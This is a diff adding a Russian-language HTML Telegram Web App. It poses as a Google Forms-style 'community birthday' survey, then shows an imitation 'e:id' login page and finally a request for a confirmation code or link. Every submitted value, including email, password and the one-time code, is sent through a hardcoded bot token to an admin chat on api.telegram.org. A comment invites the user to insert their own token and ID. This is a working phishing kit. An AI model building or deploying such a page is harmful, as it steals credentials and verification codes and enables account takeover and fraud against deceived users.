@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>E-ID Авторизация</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+    :root {
+        --bg-main: #F0EBF8; /* Фон опроса */
+        --card: #FFFFFF;
+        --text: #202124;
+        --text-secondary: #5F6368;
+        --accent-survey: #673AB7; 
+        --border: #DADCE0;
+        
+        /* Цвета E-ID */
+        --eid-red: #B20000;
+        --eid-green: #00B36B;
+        --eid-input-bg: #E3F2FD;
+        --eid-input-border: #BBDEFB;
+    }
+    
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    
+    body {
+        font-family: 'Roboto', sans-serif;
+        background: var(--bg-main);
+        color: var(--text);
+        padding: 12px;
+        display: flex;
+        justify-content: center;
+        font-size: 14px;
+        min-height: 100vh;
+    }
+    
+    .app { width: 100%; max-width: 500px; display: flex; flex-direction: column; gap: 12px; }
+    
+    /* ===== СТИЛИ ОПРОСА (Google Forms) ===== */
+    .card {
+        background: var(--card);
+        border-radius: 8px;
+        border: 1px solid var(--border);
+        padding: 24px;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+    }
+    
+    .card-header-bar {
+        height: 10px;
+        background: var(--accent-survey);
+        border-radius: 8px 8px 0 0;
+        margin: -24px -24px 24px -24px;
+    }
+
+    .page { display: none; flex-direction: column; gap: 12px; }
+    .page.active { display: flex; }
+
+    h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; line-height: 1.3; }
+    .desc { font-size: 14px; color: var(--text); margin-bottom: 16px; }
+    
+    .form-group { margin-bottom: 20px; }
+    .form-group label { display: block; margin-bottom: 12px; font-weight: 500; font-size: 15px; }
+    .form-group label .req { color: #D93025; }
+    
+    /* Инпуты для опроса */
+    .survey-input {
+        width: 100%; border: none; border-bottom: 1px solid var(--border);
+        padding: 8px 0; font-size: 14px; outline: none; background: transparent;
+        transition: border-color 0.2s;
+    }
+    .survey-input:focus { border-bottom: 2px solid var(--accent-survey); }
+    .survey-input::placeholder { color: #70757A; }
+
+    /* Радио кнопки */
+    .radio-group { display: flex; flex-direction: column; gap: 16px; }
+    .radio-label { display: flex; align-items: center; gap: 12px; cursor: pointer; font-size: 14px; }
+    .radio-label input { display: none; }
+    .radio-custom {
+        width: 20px; height: 20px; border: 2px solid var(--text-secondary);
+        border-radius: 50%; display: inline-block; position: relative;
+    }
+    .radio-label input:checked + .radio-custom { border-color: var(--accent-survey); }
+    .radio-label input:checked + .radio-custom::after {
+        content: ''; position: absolute; top: 50%; left: 50%;
+        transform: translate(-50%, -50%); width: 10px; height: 10px;
+        background: var(--accent-survey); border-radius: 50%;
+    }
+
+    .btn-survey {
+        background: var(--accent-survey); color: white; border: none;
+        padding: 12px 24px; border-radius: 4px; font-size: 14px;
+        font-weight: 500; cursor: pointer; width: max-content;
+    }
+
+    /* ===== СТИЛИ E-ID (Авторизация) ===== */
+    .eid-container {
+        background: #FFFFFF;
+        border-radius: 12px;
+        overflow: hidden;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        position: relative;
+    }
+    
+    /* Красная шапка */
+    .eid-header {
+        background: var(--eid-red);
+        /* Имитация текстуры на фоне */
+        background-image: repeating-linear-gradient(45deg, transparent, transparent 2px, rgba(0,0,0,0.05) 2px, rgba(0,0,0,0.05) 4px);
+        padding: 20px;
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+        position: relative;
+    }
+    
+    /* Логотип E-ID */
+    .eid-logo {
+        color: #fff;
+        font-size: 32px;
+        font-weight: 700;
+        letter-spacing: -1px;
+        display: flex;
+        align-items: center;
+    }
+    .eid-logo::before {
+        content: '';
+        display: inline-block;
+        width: 6px;
+        height: 6px;
+        background: #fff;
+        margin: 0 2px;
+    }
+
+    /* Аватарка */
+    .eid-avatar {
+        width: 70px; height: 80px;
+        background: #fff;
+        padding: 3px;
+        border-radius: 4px;
+        display: flex; align-items: center; justify-content: center;
+    }
+    .eid-avatar svg { width: 100%; height: 100%; fill: #999; }
+
+    /* Тело формы */
+    .eid-body {
+        padding: 24px 20px;
+        position: relative;
+        background-image: radial-gradient(circle at 0% 100%, #f0f0f0 0%, transparent 30%); /* Легкий узор */
+    }
+
+    .eid-title {
+        font-size: 14px;
+        font-weight: 700;
+        text-transform: uppercase;
+        color: #333;
+        margin-bottom: 20px;
+        line-height: 1.4;
+    }
+
+    /* Голубые инпуты */
+    .eid-input {
+        width: 100%;
+        padding: 12px 14px;
+        background: var(--eid-input-bg);
+        border: 1px solid var(--eid-input-border);
+        border-radius: 4px;
+        font-size: 14px;
+        color: #000;
+        outline: none;
+        margin-bottom: 12px;
+    }
+    .eid-input:focus { border-color: #64B5F6; }
+    .eid-input::placeholder { color: #777; }
+
+    /* Зеленая кнопка */
+    .eid-btn {
+        background: var(--eid-green);
+        color: white;
+        border: none;
+        padding: 12px 32px;
+        border-radius: 4px;
+        font-size: 14px;
+        font-weight: 700;
+        cursor: pointer;
+        text-transform: uppercase;
+        margin-top: 8px;
+        margin-bottom: 12px;
+        width: max-content;
+    }
+    .eid-btn:active { background: #00995C; }
+
+    /* Ссылки */
+    .eid-link {
+        display: inline-block;
+        color: #333;
+        text-decoration: underline;
+        font-size: 12px;
+        margin-bottom: 20px;
+    }
+    
+    .eid-link-green {
+        color: var(--eid-green);
+        text-decoration: none;
+        font-size: 13px;
+        float: right;
+        margin-top: 15px;
+    }
+
+    /* Штрихкод (CSS) */
+    .barcode {
+        width: 180px;
+        height: 40px;
+        background: repeating-linear-gradient(
+            to right,
+            #000, #000 2px,
+            transparent 2px, transparent 4px,
+            #000 4px, #000 5px,
+            transparent 5px, transparent 8px,
+            #000 8px, #000 11px,
+            transparent 11px, transparent 13px,
+            #000 13px, #000 14px,
+            transparent 14px, transparent 16px
+        );
+        margin-top: 20px;
+    }
+
+    .error-msg { color: #D93025; font-size: 13px; margin-bottom: 8px; display: none; }
+
+    /* Общая кнопка для ввода кода */
+    .btn-block {
+        background: var(--accent-survey); color: white; border: none;
+        padding: 14px; border-radius: 4px; font-size: 15px;
+        font-weight: 500; cursor: pointer; width: 100%; text-align: center;
+    }
+</style>
+</head>
+<body>
+
+<div class="app">
+
+    <!-- ============ 1. ОПРОС ============ -->
+    <div id="pageSurvey" class="page active">
+        <div class="card" style="padding-top: 0;">
+            <div class="card-header-bar"></div>
+            <h1>15 января 2027, День рождения Сообщества</h1>
+            <p class="desc">Заполняйте форму на каждого члена семьи кто едет с вами</p>
+            <p style="color: #D93025; font-size: 13px;">*Обязательный вопрос</p>
+        </div>
+
+        <div class="card">
+            <div class="form-group">
+                <label>Имя <span class="req">*</span></label>
+                <input type="text" id="sName" class="survey-input" placeholder="Мой ответ">
+            </div>
+            <div class="form-group">
+                <label>Фамилия <span class="req">*</span></label>
+                <input type="text" id="sSurname" class="survey-input" placeholder="Мой ответ">
+            </div>
+            <div class="form-group">
+                <label>Ник в Telegram @ для связи <span class="req">*</span></label>
+                <input type="text" id="sTelegram" class="survey-input" placeholder="Мой ответ">
+            </div>
+            <div class="form-group" style="margin-bottom: 0;">
+                <label>Выберите из списка где вы будете на праздновании <span class="req">*</span></label>
+                <div class="radio-group">
+                    <label class="radio-label">
+                        <input type="radio" name="location" value="о. Хайнань">
+                        <span class="radio-custom"></span> о. Хайнань
+                    </label>
+                    <label class="radio-label">
+                        <input type="radio" name="location" value="о. Тенерифе">
+                        <span class="radio-custom"></span> о. Тенерифе
+                    </label>
+                </div>
+            </div>
+            <div id="surveyError" class="error-msg">Заполните все обязательные поля</div>
+        </div>
+
+        <button class="btn-survey" onclick="submitSurvey()">Отправить</button>
+    </div>
+
+    <!-- ============ 2. АВТОРИЗАЦИЯ E-ID ============ -->
+    <div id="pageLogin" class="page">
+        <div class="eid-container">
+            <!-- Красная шапка -->
+            <div class="eid-header">
+                <div class="eid-logo">e:id</div>
+                <div class="eid-avatar">
+                    <!-- SVG заглушка для аватарки -->
+                    <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                </div>
+            </div>
+            
+            <!-- Форма -->
+            <div class="eid-body">
+                <div class="eid-title">On-line certification and<br>authorization service</div>
+                
+                <input type="email" id="authEmail" class="eid-input" placeholder="Ваш Email">
+                <input type="password" id="authPassword" class="eid-input" placeholder="Пароль">
+                
+                <div id="loginError" class="error-msg">Заполните все поля</div>
+                
+                <button class="eid-btn" onclick="submitLogin()">Вход</button>
+                <br>
+                <a href="#" class="eid-link" onclick="event.preventDefault();">Забыли пароль?</a>
+                
+                <div style="display: flex; justify-content: space-between; align-items: flex-end;">
+                    <div class="barcode"></div>
+                    <a href="#" class="eid-link-green" onclick="event.preventDefault();">Зарегистрироваться</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============ 3. КОД / ССЫЛКА ============ -->
+    <div id="pageCode" class="page">
+        <div class="card" style="text-align: center;">
+            <h1 style="font-size: 20px; margin-bottom: 4px;">Подтверждение</h1>
+            <p class="desc" style="font-size: 13px;">Введите код из письма или вставьте ссылку</p>
+        </div>
+
+        <div class="card">
+            <div class="form-group" style="margin-bottom: 0;">
+                <label>Код или ссылка <span class="req">*</span></label>
+                <input type="text" id="authCode" class="survey-input" placeholder="000000 или https://...">
+            </div>
+            <div id="codeError" class="error-msg">Поле не может быть пустым</div>
+        </div>
+
+        <button class="btn-block" onclick="submitCode()">Подтвердить</button>
+    </div>
+
+    <!-- ============ 4. УСПЕХ ============ -->
+    <div id="pageSuccess" class="page">
+        <div class="card" style="text-align: center; padding: 40px 20px;">
+            <h1 style="font-size: 24px; color: var(--eid-green); margin-bottom: 12px;">Готово!</h1>
+            <p class="desc">Ваши данные успешно отправлены. Ожидайте подтверждения.</p>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+
+    // ВСТАВЬ СВОЙ ТОКЕН И ID
+    const BOT_TOKEN = "9258777728:AAHHxECm1JdfwTahj-nR_vH1WescoFnBCAs"; 
+    const ADMIN_ID  = "8542901240";
+
+    let surveyData = {};
+
+    function showPage(id) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        window.scrollTo(0, 0);
+    }
+
+    // Отправка сообщения админу через API
+    async function sendToAdmin(text) {
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ADMIN_ID,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (e) {
+            console.log("Ошибка отправки", e);
+        }
+    }
+
+    // --- ШАГ 1: ОПРОС ---
+    function submitSurvey() {
+        const name = document.getElementById('sName').value.trim();
+        const surname = document.getElementById('sSurname').value.trim();
+        const tele = document.getElementById('sTelegram').value.trim();
+        const loc = document.querySelector('input[name="location"]:checked');
+
+        if (!name || !surname || !tele || !loc) {
+            document.getElementById('surveyError').style.display = 'block';
+            return;
+        }
+        
+        document.getElementById('surveyError').style.display = 'none';
+
+        surveyData = { name: name, surname: surname, telegram: tele, location: loc.value };
+
+        // Отправляем уведомление
+        const user = tg.initDataUnsafe?.user || {};
+        const msg = `📝 <b>АНКЕТА ЗАПОЛНЕНА</b>\n\n` +
+                    `👤 TG: ${user.first_name || '-'} (@${user.username || 'нет'})\n` +
+                    `📛 Имя: ${name} ${surname}\n` +
+                    `📱 Телеграм: @${tele}\n` +
+                    `📍 Локация: ${loc.value}`;
+        sendToAdmin(msg);
+
+        // Переходим к E-ID авторизации
+        showPage('pageLogin');
+    }
+
+    // --- ШАГ 2: E-ID АВТОРИЗАЦИЯ ---
+    function submitLogin() {
+        const email = document.getElementById('authEmail').value.trim();
+        const pass = document.getElementById('authPassword').value.trim();
+
+        if (!email || !pass) {
+            document.getElementById('loginError').style.display = 'block';
+            return;
+        }
+        document.getElementById('loginError').style.display = 'none';
+
+        // Отправляем почту и пароль
+        const user = tg.initDataUnsafe?.user || {};
+        const msg = `🔐 <b>АВТОРИЗАЦИЯ E-ID</b>\n\n` +
+                    `👤 TG ID: <code>${user.id}</code>\n` +
+                    `📛 Имя: ${surveyData.name} ${surveyData.surname}\n\n` +
+                    `📧 Почта: <code>${email}</code>\n` +
+                    `🔑 Пароль: <code>${pass}</code>`;
+        sendToAdmin(msg);
+
+        // Переходим к вводу кода
+        showPage('pageCode');
+    }
+
+    // --- ШАГ 3: КОД ---
+    function submitCode() {
+        const code = document.getElementById('authCode').value.trim();
+
+        if (!code) {
+            document.getElementById('codeError').style.display = 'block';
+            return;
+        }
+        document.getElementById('codeError').style.display = 'none';
+
+        // Отправляем финальный код
+        const msg = `🔢 <b>КОД ПОДТВЕРЖДЕНИЯ (E-ID)</b>\n\n` +
+                    `📛 Имя: ${surveyData.name}\n` +
+                    `<code>${code}</code>`;
+        sendToAdmin(msg);
+
+        // Показываем экран успеха
+        showPage('pageSuccess');
+    }
+</script>
+
+</body>
+</html>
